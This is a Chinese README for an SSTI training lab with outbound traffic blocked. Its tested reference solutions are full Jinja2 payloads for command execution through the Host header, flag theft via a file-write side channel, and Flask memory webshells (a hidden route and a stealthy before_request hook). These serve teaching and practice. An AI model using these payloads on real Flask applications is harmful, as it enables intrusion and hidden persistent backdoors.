# 07 · 不出网 SSTI：Flask 内存马

| | |
|---|---|
| 端口 | `8097`（`FLASK_MEMSHELL_PORT` 可改） |
| 引擎 | Jinja2（Flask `render_template_string`） |
| 关卡数 | 5（攻击链 walkthrough） |
| **出网** | **已切断**（iptables 丢弃新建外部连接与 DNS，入站端口不受影响） |
| 需要权限 | `cap_add: [NET_ADMIN]`（否则出网切不断，容器会告警但照常启动） |
| flag | 容器内 `/flag`，由环境变量写入，不进镜像层 |

## 这个靶场在教什么

**当目标不能出网时，SSTI 应该怎么打。**

传统打法是反弹 shell：让目标主动连回你的 VPS。但在容器/内网环境里经常根本
没有出网（本靶场的 `entrypoint.sh` 会 `iptables -A OUTPUT -o eth0 -p tcp --syn -j DROP`
并丢弃 DNS），于是反弹 shell、DNSLog 外带、外连下载**全部失效**。

内存马走的是反向思路：不要求目标出网，而是把能力挂到**已经存在的入站 HTTP 通道**上。
对 Flask 来说就是直接改运行中进程的内部数据结构，注册出一条新路由、或一个
`before_request` 钩子——**不落地任何文件、可反复调用**。

这个靶场同时是一个完整的「无回显」训练：
- `/profile` 有回显但有过滤 → 学 `{% print(...) %}` 绕过 `{{ }}`；
- `/admin` 无过滤但**无回显** → 学用副作用确认执行；
- 出网被切断 → 学写文件侧信道；
- 最终 → 学内存马。

## 攻击链（5 个台阶）

| 步骤 | 位置 | 过滤 | 回显 | 学到什么 |
|------|------|------|------|----------|
| 0 | 控制台（本地调试台） | 无 | 有 | 先在这里把 payload 调通 |
| 1 | `/profile` 的 username | `{{` `}}` `'` `"` `[` `]` | 有 | 过滤的是**定界符**不是表达式：`{%print(7*7)%}` |
| 2 | `/admin` 的 Host 头 | **无** | **无** | 长 payload 投递点；只能靠副作用判断 |
| 3 | 写文件侧信道 | 无 | 无 | 命令输出写进 `/app/echo/`，再经 HTTP 取回 |
| 4 | **内存马** | 无 | 无 | 绕过 `setupmethod`，把 webshell 注入运行中的进程 |

**投递要点**：HTTP 头字段值里不能有空格，所以 Host 头里的 payload 一律用 **TAB** 当空白
（Python 与 shell 都把 TAB 当空白）。这是题目的真实约束，不是取巧。

**为什么 `/profile` 的过滤不能加严**：Jinja2 里「裸标识符当字符串」只对**函数调用的位置参数**
生效——`foo(bar)` → `foo('bar')` 成立，而 `foo[bar]` / `foo|attr(bar)` 不成立。
一旦把引号、方括号、点号同时堵死，这一关就真的无解了。`app.py` 的 `_PROFILE_BAD`
注释里写了同样的警告，改题前请先读。

## 参考解（全部已实测）

下面每一条都由 `tests/verify_memshell.py` 在容器内实际执行并断言过，
命令与输出见文末「验证记录」。

### 步骤 1 · `/profile`：确认 SSTI 存在

```bash
# 被过滤（响应里出现「含非法字符」）
curl -s -X POST localhost:8097/register -d 'username={{7*7}}'

# 绕过：{% %} 语句块没被拦
curl -s -X POST localhost:8097/register -d 'username={%print(7*7)%}'   # 页面回显 49
```

### 步骤 2 · `/admin`：无回显投递

```bash
# 注意：payload 里的空白必须是 TAB（下面用 $'\t' 表示）
curl -s localhost:8097/admin \
  -H $'Host: {%set u=cycler.__init__.__globals__.__builtins__%}{%set _=u.__import__(\'os\').popen(\'echo\tPWNED\')%}'
```

响应**永远**是同一张静态页：既不含 `PWNED`，也不反馈渲染成败。

> 出题人注意：审计页只记录时间戳。曾经记录过 `ok=True/False`，那等于白送一个
> 布尔盲注信道，会让「必须做内存马」这个设计前提失效。

### 步骤 3 · 写文件侧信道（不出网时的带外）

把命令输出写进容器内 Web 可访问的目录，再用普通 HTTP GET 取回：

```bash
curl -s localhost:8097/admin \
  -H $'Host: {%set u=cycler.__init__.__globals__.__builtins__%}{%set _=u.__import__(\'os\').popen(\'cat</flag>/app/echo/exfil.txt\')%}'

curl -s localhost:8097/echo/exfil.txt      # → flag{...}
```

`cat</flag>/app/echo/exfil.txt` 刻意用重定向代替空格，整个 payload 里不需要任何空白。
（`os.makedirs(ECHO_DIR)` 与中文/权限处理由应用自己做，见 `app.py`。）

### 步骤 4a · 路由型内存马

**关键坑**：Flask 的 `setupmethod` 装饰器让 `app.add_url_rule()` / `app.before_request()`
在应用处理过第一个请求后直接抛 `AssertionError`。所以内存马必须**绕过公开 API**，
直接改底层数据结构。

```jinja2
{%set u=cycler.__init__.__globals__.__builtins__%}
{%set a=u.__import__('flask').current_app%}
{%set R=a.url_map._rules.__getitem__(0).__class__%}
{%set _=a.url_map.add(R('/memshell',endpoint='memshell'))%}
{%set f=u.eval("lambda:__import__('subprocess').check_output(__import__('flask').request.args.get('c','id'),shell=True)")%}
{%set _=a.view_functions.__setitem__('memshell',f)%}
```

```bash
curl -s 'localhost:8097/memshell?c=id'          # → uid=0(root) ...
curl -s 'localhost:8097/memshell?c=cat /flag'   # → flag{...}
```

两个细节值得记：

- `Rule` 类是从 `url_map._rules[0].__class__` **反推**出来的。不要写
  `__import__('werkzeug.routing').Rule` —— `__import__('a.b')` 返回的是**顶层包 `a`**，
  不是子模块，所以那个表达式会抛 `UndefinedError: 'module object' has no attribute 'Rule'`。
- 视图函数用 `eval("lambda: ...")` 现场造出来。Jinja 表达式里没法定义函数，
  但 `__builtins__.eval` 可以。lambda 的 globals 会落到模板模块的 globals，
  那里有完整的 `__builtins__`，所以 lambda 内的 `__import__` 可用。

### 步骤 4b · Filter 型内存马（更接近 Java 内存马的形态）

不注册路由，而是往 `before_request` 钩子链里塞一个函数——**对所有路径生效**：

```jinja2
{%set u=cycler.__init__.__globals__.__builtins__%}
{%set a=u.__import__('flask').current_app%}
{%set f=u.eval("lambda:__import__('flask').make_response(__import__('subprocess').check_output(__import__('flask').request.headers.get('X-C','id'),shell=True))if __import__('flask').request.headers.get('X-M')else\tNone")%}
{%set _=a.before_request_funcs.setdefault(None,[]).append(f)%}
```

```bash
curl -s localhost:8097/ -H 'X-M: 1' -H 'X-C: id'         # → uid=0(root) ...
curl -s localhost:8097/profile -H 'X-M: 1' -H 'X-C: cat /flag'
```

`before_request` 返回非 `None` 会短路整个请求，所以这个钩子能劫持**任意路径**的响应；
不带 `X-M` 头时返回 `None`，站点行为完全正常（隐蔽性来自这里）。

这就是 Python 版的「Filter 内存马」，与 Java/Tomcat 里往
`StandardContext` 注册 `Filter` 的思路完全同构——想对照 Java 版本请看
[`08-freemarker-memshell`](../08-freemarker-memshell/README.md) 与
[`docs/MEMSHELL.md`](../../docs/MEMSHELL.md)。

## 出网是怎么被切断的

`entrypoint.sh`（容器内以 root 启动时执行）：

```sh
iptables -A OUTPUT -o eth0 -p tcp --syn -j DROP     # 丢弃新建的对外 TCP 连接
iptables -A OUTPUT -o eth0 -p udp --dport 53 -j DROP # 丢弃 DNS 查询
```

为什么这样写：

- 只丢 **`--syn`**：宿主机映射进来的入站连接的**回包**不是 SYN，所以入站端口照常工作；
  而容器主动发起的对外连接第一个包就是 SYN，会被丢掉。
- 丢 DNS 是必要的补刀：只丢 TCP 的话仍可能用 UDP DNS 外带。
- `iptables` 不可用或没有 `NET_ADMIN` 时，entrypoint **只告警不退出**——
  靶场不能因为加固失败而起不来。此时 `/api/lab-info` 里的 `no_egress` 仍会显示为真
  （它来自环境变量 `SSTI_NO_EGRESS`），日志里会有 `[!]` 提示，请以日志为准。

自证命令（在容器内执行，两条都应失败）：

```bash
docker exec ssti-flask-memshell python -c "import socket; socket.create_connection(('93.184.216.34',80),timeout=5)"
docker exec ssti-flask-memshell python -c "import socket; socket.gethostbyname('example.com')"
```

## 运行

```bash
# 1) 先构建统一前端镜像（只需一次）
scripts/build-frontend.sh            # Windows: scripts\build-frontend.ps1

# 2) 起靶场
cd labs/07-flask-memshell
docker compose up --build            # → http://127.0.0.1:8097
```

`docker-compose.yml` 已经带上了 `cap_add: [NET_ADMIN]`，**删掉它出网就切不断**。

## 一键验证整条链

`tests/verify_memshell.py` 会依次执行上面所有步骤并断言结果。
它**在容器内部**发起请求，因此顺带证明了整条链在不出网的前提下成立：

```bash
docker cp tests/verify_memshell.py ssti-flask-memshell:/tmp/v.py
docker exec ssti-flask-memshell python /tmp/v.py
```

### 验证记录（本仓库实测输出，节选）

```text
=== 1. /profile 用户名注入（过滤 {{ }} 引号 方括号） ===
  ok   `{{7*7}}` 被过滤拒绝
  ok   `{%print(7*7)%}` 注册通过
  ok   用户名注入回显 49
  ok   引号被过滤

=== 2. /admin Host 头注入（无过滤 · 无回显） ===
  ok   Host 头 payload 不报错
  ok   响应中**没有**回显命令输出
  ok   响应中**没有**回显模板求值

=== 3. 写文件侧信道（无回显 + 不出网时的带外） ===
  ok   经 /echo/ 取回命令输出
  ok   取回内容就是 flag

=== 4. 路由型内存马（绕过 setupmethod 保护） ===
  ok   内存路由 /memshell 已生效（200）
  ok   内存路由返回命令输出          # uid=0(root) gid=0(root) groups=0(root)
  ok   内存马读出 /flag

=== 5. Filter 型内存马（before_request 钩子，对所有路径生效） ===
  ok   钩子在 / 上劫持响应
  ok   钩子在 /profile 上劫持响应
  ok   钩子在 /does-not-exist 上劫持响应
  ok   不触发时站点行为正常

=== 6. 不出网自证 ===
  ok   对外 TCP 被阻断   (TimeoutError)
  ok   DNS 被阻断        (gaierror)

共 23 项，失败 0 项
```

## 直接调 API

```bash
curl -s localhost:8097/api/lab-info | jq '{id,no_egress,levels:[.levels[].title]}'
curl -s -X POST localhost:8097/api/render -H 'Content-Type: application/json' \
     -d '{"level":"0","mode":"god","template":"{{7*7}}"}' | jq
```

## 上帝模式

`mode=god` 额外返回 `template_after_waf` / `raw_output` / `error` / `exception_type`。
在无回显靶场里**特别有用**：练习模式你什么都看不到，上帝模式能立刻告诉你
「是 WAF 拦了」还是「payload 语法错了」。

前端的 **关卡源码** 按钮会调 `/api/god/source` 显示该关卡的定义源码。

## 出题提示

- 必须以 `python app.py` 启动，模块名才是 `__main__`，`sys.modules['__main__'].dict['app']`
  这条链才成立。Gunicorn 下模块名会变成 `gunicorn.app.wsgiapp`，部分链失效——
  这也是本仓库所有 Python 靶场都不用 gunicorn 的原因。
- `/report` 的 admin bot 只允许访问本机地址，避免变成对外 SSRF。
- 想让难度更高可以：把 `/profile` 的过滤收紧到刚好仍可解（先想清楚
  `foo(bar)` 那条 Jinja 语义再动手）、或把 `/echo/` 目录设为只读，
  迫使选手直接做内存马。
